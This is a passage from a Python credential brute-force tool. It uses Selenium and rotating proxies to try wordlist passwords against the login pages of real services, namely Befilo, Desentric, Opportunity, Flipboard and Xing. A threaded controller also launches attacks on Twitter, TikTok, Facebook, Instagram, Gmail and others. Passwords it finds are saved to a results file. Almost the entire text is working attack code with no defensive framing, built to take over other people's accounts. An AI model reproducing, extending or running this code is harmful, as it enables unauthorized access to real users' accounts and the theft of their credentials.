                    By.XPATH, "//input[@name='username']"), options.befilo)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "//button[@class='login-button']").click()
            try:
                brows.find_element(
                    By.XPATH, "//p[normalize-space()='Invalid username or password']")
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                brows.find_element(
                    By.XPATH, "//input[@name='password']").clear()
                count_login += 1
                # if count_login == 5:
                #     count_login = 0
                #     brows.quit()
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("befilo-" +
                                                            options.befilo+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ===============================DESENTRIC======================================


def desentric():
    count_while = 0
    count_login = 0
    print("{}Desentric Account: {}".format(
        Fore.LIGHTCYAN_EX, options.desentric))
    print("{}<<<<<<+++++Start Attacking Desentric++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('desentric'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://desentric.com//guest")
                try:
                    brows.find_element(By.XPATH, "(//button)[3]/..").click()
                except:
                    print
                time.sleep(1)
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='email']"), options.desentric)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            if len(password) < 6 or len(password) > 20:
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                count_while += 1
                continue
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "(//button)[2]").click()
            try:
                t = time.time()
                while True:
                    text = brows.find_element(By.XPATH, "(//button)[2]").text
                    if text == "DONE! PLEASE WAIT..":
                        raise selenium.common.exceptions.NoSuchElementException
                    if text == "LOGIN":
                        break
                    if time.time() - t > 10:
                        brows.quit()
                        count_login = 0
                        continue
                brows.find_element(
                    By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_login += 1
                # if count_login == 5:
                #     count_login = 0
                #     brows.quit()
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("desentric-" +
                                                            options.desentric+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ===============================OPPORTUNITY====================================
# not


def opportunity():
    count_while = 0
    count_login = 0
    print("{}Opportunity Account: {}".format(
        Fore.LIGHTCYAN_EX, options.opportunity))
    print("{}<<<<<<+++++Start Attacking Opportunity++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('opportunity'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://myopportunity.com/signin")
                time.sleep(15)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='email']"), options.opportunity)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            old_id = brows.find_element_by_tag_name('html').id
            brows.find_element(
                By.XPATH, "//button").click()
            while brows.find_element_by_tag_name('html').id != old_id:
                continue
            if brows.current_url == "https://myopportunity.com/leads":
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("opportunity-" +
                                                            options.opportunity+":"+password+"\n")
                brows.quit()
                break
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_login += 1
            # if count_login == 5:
            #     count_login = 0
            #     brows.quit()
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException) as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================FLIPBOARD=====================================
# not


def flipboard():
    count_while = 0
    count_login = 0
    print("{}Flipboard Account: {}".format(
        Fore.LIGHTCYAN_EX, options.flipboard))
    print("{}<<<<<<+++++Start Attacking Flipboard++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('flipboard'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://flipboard.com/login")
                send_keys(brows.find_element(
                    By.XPATH, "//input[@name='username']"), options.flipboard)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@name='password']"), password)
            brows.find_element(
                By.XPATH, "(//button)[5]").click()
            # try:
            #     t = time.time()
            #     while True:
            #         text = brows.find_element(By.XPATH, "(//button)[2]").text
            #         if text == "DONE! PLEASE WAIT..":
            #             raise selenium.common.exceptions.NoSuchElementException
            #         if text == "LOGIN":
            #             break
            #         if time.time() - t > 10:
            #             brows.quit()
            #             count_login = 0
            #             continue
            #     brows.find_element(
            #         By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
            #     print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            #     count_login += 1
            #     # if count_login == 5:
            #     #     count_login = 0
            #     #     brows.quit()
            #     count_while += 1
            # except selenium.common.exceptions.NoSuchElementException:
            #     print(
            #         "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
            #     io.open("BruteForce_result.txt", "a").write("flipboard-" +
            #                                                 options.flipboard+":"+password+"\n")
            #     brows.quit()
            #     break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ==================================XING========================================
# not


def xing():
    count_while = 0
    count_login = 0
    print("{}Xing Account: {}".format(
        Fore.LIGHTCYAN_EX, options.xing))
    print("{}<<<<<<+++++Start Attacking Xing++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
    brows = None
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('xing'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://login.xing.com/")
                try:
                    brows.find_element(By.XPATH, "(//button)[4]").click()
                except:
                    print
                send_keys(brows.find_element(
                    By.XPATH, "//input[@id='username']"), options.xing)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            send_keys(brows.find_element(
                By.XPATH, "//input[@id='password']"), password)
            brows.find_element(
                By.XPATH, "(//button)[2]").click()
            try:
                t = time.time()
                while True:
                    text = brows.find_element(By.XPATH, "(//button)[2]").text
                    print(text)
                    if text == "DONE! PLEASE WAIT..":
                        raise selenium.common.exceptions.NoSuchElementException
                    if text == "Log in":
                        break
                    if time.time() - t > 10:
                        brows.quit()
                        count_login = 0
                        continue
                brows.find_element(
                    By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_login += 1
                # if count_login == 5:
                #     count_login = 0
                #     brows.quit()
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("BruteForce_result.txt", "a").write("xing-" +
                                                            options.xing+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except:
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ================================SEND KEYS====================================


def send_keys(element, key):
    for s in list(key):
        element.send_keys(s)
        time.sleep(0.005/len(key))
# ================================CONTROL======================================


try:
    if options.list_password != None:
        load_password_list()
    check = False
    if options.getproxylist != None:
        getProxyList()
    if options.twitter != None:
        twitter = threading.Thread(target=twitter, name="twitter")
        check = True
        twitter.start()
    if options.tiktok != None:
        tiktok = threading.Thread(target=tiktok, name="tiktok")
        check = True
        tiktok.start()
    if options.youtube != None:
        youtube = threading.Thread(target=youtube, name="youtube")
        check = True
        youtube.start()
    if options.facebook != None:
        facebook = threading.Thread(
            target=facebook, name="facebook")
        check = True
        facebook.start()
    if options.instagram != None:
        instagram = threading.Thread(
            target=instagram, name="Instagram")
        check = True
        instagram.start()
    if options.gmail != None:
        gmail = threading.Thread(target=gmail, name="Gmail")
        check = True
        gmail.start()
    if options.gapo != None:
        gapo = threading.Thread(target=gapo, name="Gapo")
        check = True
        gapo.start()
    if options.biztime != None:
        biztime = threading.Thread(target=biztime, name="Biztime")
        check = True
        biztime.start()
    if options.hahalolo != None:
        hahalolo = threading.Thread(
            target=hahalolo, name="Hahalolo")
        check = True
        hahalolo.start()
    if options.flickr != None:
        flickr = threading.Thread(
            target=flickr, name="Flickr")
        check = True
        flickr.start()
    if options.tumblr != None:
        tumblr = threading.Thread(
            target=tumblr, name="Tumblr")
        check = True
        tumblr.start()
    if options.zoimas != None:
        zoimas = threading.Thread(
            target=zoimas, name="Zoimas")
        check = True
        zoimas.start()
    if options.befilo != None:
        befilo = threading.Thread(
            target=befilo, name="Befilo")
        check = True
        befilo.start()
    if options.desentric != None:
        desentric = threading.Thread(
            target=desentric, name="Desentric")
        check = True
        desentric.start()
    if options.opportunity != None:
        opportunity = threading.Thread(
            target=opportunity, name="Opportunity")
        check = True
        opportunity.start()
    if options.flipboard != None:
        flipboard = threading.Thread(
            target=flipboard, name="Flipboard")
        check = True
        flipboard.start()
    if options.xing != None:
        xing = threading.Thread(
            target=xing, name="Xing")
        check = True
        xing.start()
    if not check:
        print(use.usage)
        exit()
except:
    sys.exit(0)
